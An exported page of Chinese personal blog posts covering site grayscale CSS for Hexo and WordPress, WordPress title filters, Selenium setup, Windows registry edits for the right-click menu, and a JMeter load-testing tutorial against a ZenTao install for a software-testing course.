                    <button class="btn" onclick="activeTag('Hexo');">Hexo</button>
                    
                    <button class="btn" onclick="activeTag('WordPress');">WordPress</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/26/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>在“额外CSS”中加入代码。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/1ff4099a6177a54d86cf9d60314eff95.jpeg</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>26a31d07</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>核心样式代码</h1>
<pre><code class="language-css">html {
    -webkit-filter: grayscale(100%);
    -moz-filter: grayscale(100%);
    -ms-filter: grayscale(100%);
    -o-filter: grayscale(100%);
    filter: grayscale(100%);
    filter: gray;
    filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);
}
</code></pre>
<p>其实直接这样写也行：</p>
<pre><code class="language-css">html{
    filter: grayscale(100%);
}
</code></pre>
<p>但是考虑到 IE 兼容性就写得比较多。</p>
<h1>Hexo</h1>
<h2>全站变灰</h2>
<p>这里以 Butterfly 主题为例。新建 css 文件，包含以上代码内容，然后在主题配置文件中 inject 即可。</p>
<pre><code class="language-yaml">inject:
  head:
    # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;
    # 网页变灰CSS
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/gray.css&quot;&gt;
</code></pre>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/125708748">用代码如何实现整个网站变灰？ - 知乎 (zhihu.com)</a></p>
<h2>指定页面变灰</h2>
<p>引入以下 js 文件：</p>
<pre><code class="language-js">let style = document.createElement('style')
let graySelector = 'gray-filter'
style.setAttribute('type', 'text/css')
style.textContent = `.${graySelector}{
  -webkit-filter: grayscale(100%);
  -moz-filter: grayscale(100%);
  -ms-filter: grayscale(100%);
  -o-filter: grayscale(100%);
  filter: grayscale(100%);
  filter: gray;
  filter: progid:dximagetransform.microsoft.basicimage(grayscale=1);
}`
document.head.appendChild(style)

let root = document.querySelector('html')
url = window.location.pathname // 取的是文件路径
toggleClassName(root,graySelector)

function toggleClassName(el,name){
    if(url===&quot;/p/26a31d07/&quot;) // 指定你要变灰的网页
        el.className = [el.className, name].join(' ')
}
</code></pre>
<pre><code class="language-yaml">inject:
	head:
		# ... ...
	bottom:
	    # 单页面变灰  
		- &lt;script src=&quot;/js/gray_page.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>参考：</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000042999615">前端 - 如何在网页置灰的时候，部分元素保持彩色-有意思的面试题 - 蜗牛老湿 - SegmentFault 思否</a></li>
<li><a href="https://blog.csdn.net/u013288800/article/details/82787641">使用JS获取当前页面的URL(网址信息)_js 获取url-CSDN博客</a></li>
</ul>
<h1>Wordpress</h1>
<h2>全站变灰</h2>
<p>在主题自定义中，找到“额外 CSS”选项，加入上方核心代码片段。</p>
<h2>仅让首页变灰</h2>
<p>打开仪表盘，进入外观中的主题文件编辑器中，找到 functions.php 文件。在其最末尾添加上：</p>
<pre><code class="language-php">function nicetheme_global_greyscale() {
    if ( is_home() ){
        echo '&lt;style type=&quot;text/css&quot;&gt;html{-webkit-filter:grayscale(1);-webkit-filter:grayscale(100%);filter:grayscale(100%);-webkit-filter:gray;filter:gray;filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);}&lt;/style&gt;';
    }
}
add_action('wp_head', 'nicetheme_global_greyscale');
</code></pre>
<p>更多情形，详见以下参考链接：</p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/1944792">wordpress 如何让网站变成灰色 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://www.ourboke.com/1749.html">用代码轻松实现 WordPress 网站全站变灰教程 Ourboke 联盟</a></li>
<li><a href="http://www.maqingxi.com/archives/4901.html">WordPress 网站如何实现全站变灰？ - 醒悟的凡灵 (maqingxi.com)</a></li>
<li><a href="https://www.mbx0.com/4117.html">wordpress 网站全站变灰教程 - 墨白社区 (mbx0.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1780203637" class="record">
            <header>
                <h1 class="record-title">WordPress 修改文章标题前的「私密」和「密码保护」</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('搬运');">搬运</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/1/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>在functions.php添加自定义函数。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6a1bc075</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>打开仪表盘&gt;外观&gt;主题文件编辑器，找到functions.php，添加以下代码：</p>
<pre><code class="language-php">add_filter( 'private_title_format', 'your_private_title_format' ); //私密
add_filter( 'protected_title_format', 'your_private_title_format' ); //密码保护

function your_private_title_format( $format ) {
	return '%s'; //这个不能省略
}
</code></pre>
<p><code>return '%s'</code> 表示直接返回标题，也可以根据自己的需要，分别为 私密 和 密码保护 撰写不同的函数，定义返回的标题格式即可。比如：</p>
<pre><code class="language-php">//私密
add_filter( 'private_title_format', 'your_private_title_format' );
function your_private_title_format( $format ) {
	return '[私密] %s';
}

//密码保护
add_filter( 'protected_title_format', 'your_protected_title_format' );
function your_protected_title_format( $format ) {
	return '[密码保护] %s';
}
</code></pre>
<p>来源：<a href="http://yangjunwei.com/1557.html">WordPress修改标题前的”私密”和”密码保护” - YangJunwei</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2392872481" class="record">
            <header>
                <h1 class="record-title">Selenium的安装与使用</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Selenium');">Selenium</button>
                    
                    <button class="btn" onclick="activeTag('SeleniumIDE');">SeleniumIDE</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>Selenium的测试过程简述。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/se.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>8ea05621</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>这篇文章主要介绍 Selenium 的安装与简单使用。</p>
<p>标记说明：带 🎈 标记表示本教程所使用的方法或软件。</p>
<h1>浏览器下载</h1>
<p>准备好一款浏览器，Chrome、Firefox、Edge🎈 等。</p>
<h1>下载 Selenium IDE</h1>
<p>Selenium IDE 是一款浏览器插件。通过该插件，测试人员可以模拟需要测试的动作，然后导出为各种语言编写的测试脚本。</p>
<p>请在浏览器对应的应用市场下载插件：</p>
<ul>
<li>Chrome 插件下载：在网络条件允许下，到 Google 应用商店下载。</li>
<li>Firefox 插件下载：在 Add-on 插件商场下载。</li>
<li>Edge 插件下载：在 Edge 外接程序应用市场下载<a href="https://microsoftedge.microsoft.com/addons/detail/selenium-ide/ajdpfmkffanmkhejnopjppegokpogffp">Selenium IDE - Microsoft Edge Addons</a>🎈。（或使用 Edge 打开谷歌应用市场下载）。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-4-1024x231.png" alt=""></p>
<p>或者在官网下载，依照官网指南进行安装：<a href="https://www.selenium.dev/selenium-ide/">Selenium IDE · Open source record and playback test automation for the web</a></p>
<h1>下载语言库</h1>
<p>根据你测试打算用的语言，下载对应的库，并导入到你的项目里。</p>
<p>支持语言：</p>
<ul>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-0">Java</a>🎈</li>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-1">Python</a></li>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-2">CSharp</a></li>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-3">Ruby</a></li>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-4">JavaScript</a></li>
<li><a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_library/#tabs-0-5">Kotlin</a></li>
</ul>
<h1>下载一个 WebDriver 并配置好环境</h1>
<p>下载对应你浏览器的 WebDriver。</p>
<p>ChromeDriver 下载：<a href="https://chromedriver.chromium.org/home">ChromeDriver - WebDriver for Chrome (chromium.org)</a>，注意下载对应你谷歌浏览器版本的那个。</p>
<p>Microsoft Edge WebDriver 下载 🎈：<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">Microsoft Edge WebDriver - Microsoft Edge Developer</a></p>
<p>其他浏览器 WebDriver 的下载请看官方教程：<a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_drivers/">Install browser drivers Selenium</a></p>
<p>Selenium 文档中提供三种方法：</p>
<ul>
<li>Driver Management Software</li>
<li>设置 Path 环境变量（❔ 亲测设置失败）</li>
<li>在代码中设置 🎈</li>
</ul>
<p>在环境配置这里，我使用官方提供的第三种方法，直接代码写死环境。</p>
<blockquote>
<p><em>3. Hard Coded Location</em> Selenium <a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_drivers/#3-hard-coded-location">官网-环境配置</a></p>
<p>Similar to Option 2 above, you need to manually download the driver (See <a href="https://www.selenium.dev/documentation/webdriver/getting_started/install_drivers/#quick-reference">Quick Reference Section</a> for links). Specifying the location in the code itself has the advantage of not needing to figure out Environment Variables on your system, but has the drawback of making the code much less flexible.</p>
</blockquote>
<p>比如，在设置 Driver 时：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1024x316.png" alt=""></p>
<h1>使用和测试</h1>
<p>在浏览器中使用 Selenium IDE。一开始，它会让你设置一个基地址，就是你要测试的网页。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-5.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-6.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-7-1024x286.png" alt=""></p>
<p>动作录制结束后，你可以进行微调或增删，最后导出脚本：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3-1024x502.png" alt=""></p>
<p>查看生成的脚本，挑取所需的片段，复制到你的测试代码中。</p>
<p>提示：关于 driver 的亲测正确配置方法请看上一节的截图。</p>
<h1>本文参考</h1>
<ul>
<li>Selenium 文档：<a href="https://www.selenium.dev/documentation/overview/">Selenium overview Selenium</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1864583727" class="record">
            <header>
                <h1 class="record-title">Windows 管理右键菜单</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('VSCode');">VSCode</button>
                    
                    <button class="btn" onclick="activeTag('Windows');">Windows</button>
                    
                    <button class="btn" onclick="activeTag('右键管理');">右键管理</button>
                    
                    <button class="btn" onclick="activeTag('搬运');">搬运</button>
                    
                    <button class="btn" onclick="activeTag('注册表');">注册表</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/10/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过操作注册表编辑器进行右键菜单管理操作。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/%E5%8F%B3%E9%94%AE.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>6f234a2f</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>以下列举了 Windows 管理右键菜单的各种操作。</p>
<p><strong>注意：修改注册表有风险，请谨慎操作！</strong></p>
<h1>将“用 VSCode 打开”添加到右键菜单中</h1>
<p>在右键菜单中，添加“Open With Code”的方法。</p>
<p>新建文本文件，在文本文件中填写以下内容：</p>
<pre><code class="language-bash">Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\*\shell\VSCode]
@=&quot;Open with Code&quot;
&quot;Icon&quot;=&quot;D:\\Microsoft VS Code\\Code.exe&quot;

[HKEY_CLASSES_ROOT\*\shell\VSCode\command]
@=&quot;\&quot;D:\\Microsoft VS Code\\Code.exe\&quot; \&quot;%1\&quot;&quot;

Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\Directory\shell\VSCode]
@=&quot;Open with Code&quot;
&quot;Icon&quot;=&quot;D:\\Microsoft VS Code\\Code.exe&quot;

[HKEY_CLASSES_ROOT\Directory\shell\VSCode\command]
@=&quot;\&quot;D:\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;

Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode]
@=&quot;Open with Code&quot;
&quot;Icon&quot;=&quot;D:\\Microsoft VS Code\\Code.exe&quot;

[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode\command]
@=&quot;\&quot;D:\\Microsoft VS Code\\Code.exe\&quot; \&quot;%V\&quot;&quot;
</code></pre>
<p>把其中的”D:\\Microsoft VS Code\\Code.exe“修改为你的 VSCode 的路径。请注意路径中 &quot; 斜杠”的个数！以及斜杠的位置，特别是**\&quot;**出现的位置！</p>
<p>保存后，将文件重命名为以”.reg“为后缀的名字，重命名后图标会变。像这样：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-e8.png" alt=""></p>
<p>双击运行，并在弹出窗口中选择确认即可。</p>
<p>附：找到 VSCode 的路径方法。桌面快捷方式右键&gt;选择属性&gt;打开文件位置。在开始菜单中则使用如图所示的方法。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-9asd.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd0.png" alt=""></p>
<p>”目标“字段即是路径。</p>
<p>效果展示：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd1.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd2.png" alt=""></p>
<p>来源：<a href="https://www.cnblogs.com/jswl/p/9935998.html">将 VSCode 添加至右键菜单（Windows 下） - 菊次郎的秋天 - 博客园 (cnblogs.com)</a></p>
<h1>管理右键菜单中的“新建”菜单</h1>
<p>快捷键 Win+R 打开“运行”窗口，输入 regedit 后回车，打开注册表编辑器。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd4.png" alt=""></p>
<p>在这个目录下，点击 Classes，里面列出了新建文件的格式。</p>
<pre><code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd3.png" alt=""></p>
<p>考虑好你要删除的格式后，打开：</p>
<pre><code>HKEY_CLASSES_ROOT\.contact
</code></pre>
<p>.contact 替换你想要删除的项目。比如.contact 为新建“联系人”的项目。进入目录后删除下属子项 ShellNew。</p>
<p>来源：<a href="https://www.bbsmax.com/A/Gkz1166GzR/">Win10 自定义右键新建菜单 (bbsmax.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3569684170" class="record">
            <header>
                <h1 class="record-title">JMeter的安装与使用</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('JMeter');">JMeter</button>
                    
                    <button class="btn" onclick="activeTag('安装');">安装</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/16/2022</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/jmetercover.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>JMeter的安装使用方法介绍，以及“禅道”项目管理系统的部分使用问题解答。内有针对软件工程专业选了《软件测试》这门课的同学的温馨提醒。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d4c50eca</span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>安装</h1>
<p>官网下载：<a href="https://jmeter.apache.org/">Apache JMeter - Apache JMeter™</a></p>
<p>下载后直接解压到你想要的位置。进入文件夹中的bin\下，运行批处理文件jmeter.bat。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E8%BF%90%E8%A1%8C.png" alt="img"></p>
<p>弹出小黑框后不要关，等一会后GUI界面就会显示出来。</p>
<p>参考：<a href="https://blog.csdn.net/weixin_47227973/article/details/112545558">Jmeter开启_weixin_47227973的博客-CSDN博客_jmeter怎么打开</a></p>
<h1>使用</h1>
<h2>项目的保存和项目的打开操作</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413153733.png" alt="QQ截图20220413153733.png (429×304) "></p>
<p>项目的打开</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413000026.png" alt="QQ截图20220413000026.png (238×304) (haha)"></p>
<h2>添加线程组</h2>
<p>打开后，添加线程组。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E6%89%93%E5%BC%80-1024x577.png" alt="打开-1024x577.png (1024×577) (haha)"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220412192551.png" alt="QQ截图20220412192551.png (811×374) (haha)"></p>
<p>在线程组中，可以对线程组的线程数和循环次数进行设置。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220412192702.png" alt="QQ截图20220412192702.png (1007×856) (haha)"></p>
<h2>录制控制器的添加</h2>
<p>录制控制器可以对录制的内容进行操作。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220412231809.png" alt="QQ截图20220412231809.png (707×432) (haha)"></p>
<h2>代理服务器的添加和使用</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220412231948.png" alt="QQ截图20220412231948.png (647×276) (haha)"></p>
<p>通过添加代理服务器实现录制操作。</p>
<p>设置端口，随便设，这里我设8888。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-17-1024x358.png" alt="此图片的alt属性为空；文件名为image-17-1024x358.png"></p>
<p>打开电脑设置中的代理，开启代理：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-16-1024x691.png" alt="此图片的alt属性为空；文件名为image-16-1024x691.png"></p>
<p>开启代理后，你将无法访问互联网。这时把端口设为刚刚在JMeter设置的端口号8888。保存。</p>
<p>返回JMeter的代理服务器，并开启。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413000009-1024x536.png" alt="QQ截图20220413000009-1024x536.png (1024×536) (haha)"></p>
<p>所有通过代理服务器的网页动作都会被记录。会注意到Recording Controller左侧多了展开符号。如果出现没有操作被录制的问题，请检查自己在每次修改系统“代理”设置后，有没有点击“保存“按钮。</p>
<h2>添加结果树</h2>
<p>录制完成后，保留需要的内容。然后添加结果树以展示执行结果。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413154123.png" alt="QQ截图20220413154123.png (761×689) (haha)"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E7%BB%93%E6%9E%9C%E6%A0%91.png" alt="结果树.png (1022×698) (haha)"></p>
<p>点击运行绿色的运行按钮，可展示执行结果。（在这个例子里，我只保留登录请求）</p>
<p>温馨提示：录制中如果存在密码输入问题，检查一下这个地方（下图），可能需要将加密内容（MD5）手动改为密码文本。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413161408-1024x519.png" alt="QQ截图20220413161408-1024x519.png (1024×519) (haha)"></p>
<h2>用户自定义变量的添加与使用</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E7%94%A8%E6%88%B7%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F.png" alt="用户自定义变量.png (667×330) (haha)"></p>
<p>添加自己定义的变量并使用：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-18-1024x705.png" alt="image-18-1024x705.png (1024×705) (haha)"></p>
<p>添加变量</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413164022-1-1024x493.png" alt="QQ截图20220413164022-1-1024x493.png (1024×493) (haha)"></p>
<p>使用变量</p>
<h2>读取CSV文件</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413165052.png" alt="QQ截图20220413165052.png (712×219) (haha)"></p>
<p>参数配置如下。注意，csv变量名设置后，可在一个HTTP Request进行使用。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413165506-1024x349.png" alt="QQ截图20220413165506-1024x349.png (1024×349) (haha)"></p>
<p>调整线程组中线程数，比如你的CSV文件里的记录数，点击绿色的执行按钮，即可在结果树中查看执行结果。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-19.png" alt="image-19.png (569×350) (haha)"></p>
<h2>断言</h2>
<p>添加断言。在这里，我添加的是一个BeanShell Assertion断言。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220413171109.png" alt="QQ截图20220413171109.png (634×170) (haha)"></p>
<p>通过断言我们可以对执行结果进行判断。例如检查登录情况：</p>
<pre><code class="language-java">String response = prev.getResponseDataAsString();
if(!response.contains(&quot;success&quot;)){
	Failure=true;
	FailureMessage=&quot;登录失败&quot;;
}
else{
	Failure=false;
}
</code></pre>
<p>以上代码即检查相应中是否包含“success”文字，不包含即失败。</p>
<h2>聚合报告</h2>
<p>添加聚合报告的方法如下：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2sad9.png" alt="image-29.png (696×593) (haha)"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-33-1024x660.png" alt="image-33-1024x660.png (1024×660) (haha)"></p>
<p>附：聚合报告分析<a href="https://blog.csdn.net/weixin_50829653/article/details/118675802">JMeter基础 — JMeter聚合报告详解_测试萌萌的博客-CSDN博客_jmeter聚合报告</a></p>
<h2>生成HTML格式的性能报告</h2>
<p>输入以下命令：</p>
<pre><code class="language-sh"> D:\apache-jmeter-5.4.3\bin\jmeter -n -t &quot;Recording Controller.jmx&quot; -l result.jtl -e -o .\ResultReport
</code></pre>
<ul>
<li>参数D:\apache-jmeter-5.4.3\bin\jmeter表示jmeter可执行文件的路径；</li>
<li>参数&quot;Recording Controller.jmx&quot;表示项目文件，文件名有空格的记得加个双引号；</li>
<li>参数result.jtl表示生成的jtl文件名；</li>
<li>参数.\ResultReport表示生成的目标文件夹。</li>
</ul>
<p>例如，运行：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-30-1024x20.png" alt="image-30-1024x20.png (1024×20) (haha)"></p>
<p>有以下结果：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/images-31.png" alt="image-31.png (697×730) (haha)"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-32-1024x447.png" alt="image-32-1024x447.png (1024×447) (haha)"></p>
<p>操作及图标信息详解参考：<a href="https://www.cnblogs.com/lirongyang/p/15595206.html">Jmeter(三十七) - 从入门到精通进阶篇 - 输出HTML格式的性能测试报告（详解教程） - 李荣洋 - 博客园 (cnblogs.com)</a></p>
<h1>针对要做《软件测试》课程实验的TJUers温馨提示</h1>
<h2>LAMP</h2>
<p>TJU软件工程专业的《软件测试》课程”实验6-Jmeter压力测试“中要求自己搭建一个LAMP环境。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1asd5.png" alt="img">实验6 实验指导书节选</p>
<p>这里指路我的另一篇文章《个人（博客）建站经验分享【持续更新-4.12最新】 - 半方池水半方田 》“以供大家参考，里面就是一些阿里云的文档链接，我在服务器上搭LAMP时参考的就是这些内容。</p>
<p>如果你使用接下来介绍的“禅道”，使用一键安装包，不需要亲手搭LAMP（也许）。</p>
<h2>sysstat工具的安装</h2>
<p>Linux下：</p>
<pre><code class="language-sh">wget -c http://pagesperso-orange.fr/sebastien.godard/sysstat-11.7.3-1.x86_64.rpm
rpm -Uvh sysstat-11.7.3-1.x86_64.rpm
</code></pre>
<p>参考：<a href="https://blog.csdn.net/sinat_28317385/article/details/112967462">sysstat命令的安装和使用_安澜仙王的博客-CSDN博客_sysstat</a></p>
<p><a href="https://blog.csdn.net/sixisixsix/article/details/106430379">sysstat 工具详细说明（一）_ⅨⅦ的博客-CSDN博客_syss</a></p>
<h2>禅道</h2>
<p>待测系统部分我采用禅道项目管理软件，安装与操作指南见：<a href="https://www.zentao.net/book/zentaopmshelp/90.html">linux用一键安装包 - 禅道开源版使用帮助 - 禅道开源项目管理软件 (zentao.net)</a>。注意记住你开启的Apache端口和Mysql端口。比如这篇教程的81端口和3307端口。<br>
<strong>突然发现，好像禅道的Linux一键安装包里面有apache, php, mysql，是不是说LAMP其实不用搭......</strong></p>
<p>如果你已经安了LAMP，尝试看这篇安装禅道：<a href="https://www.zentao.net/book/zentaopmshelp/101.html">使用源码包安装(各系统通用) - 禅道开源版使用帮助 - 禅道开源项目管理软件 (zentao.net)</a></p>
<p>正常打开的界面:</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220411234927-1024x549.png" alt="QQ截图20220411234927-1024x549.png (1024×549) (haha)"></p>
<p>如果你在云服务器进行操作，别忘了在安全组打开端口。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220411234940-1024x47.png" alt="QQ截图20220411234940-1024x47.png (1024×47) (haha)"></p>
<h2>增加/编辑项目</h2>
<p>在这个实验中，我遇到的难题就是JMeter不能模拟增加Bug，修改Bug标题的操作。花了一天，我用自己的野生智慧采用野生方法解决了问题。</p>
<p>就是在关键的、填写表单的POST请求中，表头增加Cookie字段即可。<strong>（提醒：此问题为多数童鞋普遍问题！！）</strong></p>
<p>Cookie的获取方法很多，这里提供我突然得到“启示”的步骤供参考：打开禅道管理页面，在准备提交表单之前，借助浏览器的开发者工具进行抓包（你也可以使用其他的抓包工具）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20-1024x159.png" alt="image-20-1024x159.png (1024×159) (haha)"></p>
<p>在开启开发者模式下，模拟一遍“提Bug”操作，筛选出想要的请求。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-21-1024x546.png" alt="image-21-1024x546.png (1024×546) (haha)"></p>
<p>在JMeter对应的记录中，往Header里再增加一项Cookie：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-22-1024x195.png" alt="img"></p>
<p>正确的返回数据：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-23-1024x123.png" alt="img"></p>
<p>之前错误的返回数据（HTML）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-24.png" alt="img"></p>
<p>灵感来源：<a href="https://blog.csdn.net/m0_51274044/article/details/123880182">使用fiddler+jmeter写登录禅道、提交bug的脚本_千与学程序的博客-CSDN博客</a> 受到该文章中改Header的操作的启示。</p>
<h2>禅道内批量导入用户数据（选做）</h2>
<p>请看我的另一篇文章：《“禅道”的配置与数据库连接 - 半方池水半方田》</p>
<h1>提醒中的提醒</h1>
<p>使用JMeter录制不成功咋办？</p>
<p>检查JMeter代理服务器选上录制控制器了没<br>
检查本机代理有没有开启成功，试着调换一下JMeter HTTP代理、本机网络代理的开启顺序<br>
录制到的HTTP请求是实时更新在JM</p>
<p>祝大家实验顺利！</p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="2497000883" class="record">
            <header>
                <h1 class="record-title">WordPress 修改 functions 的方法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/17/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>提供两种方法。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>94d535b3</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>现提供两种方法。</p>
<h1>仪表盘修改</h1>
<p>打开仪表盘&gt;主题文件编辑器&gt;functions.php</p>
<p>直接在代码框进行修改。</p>
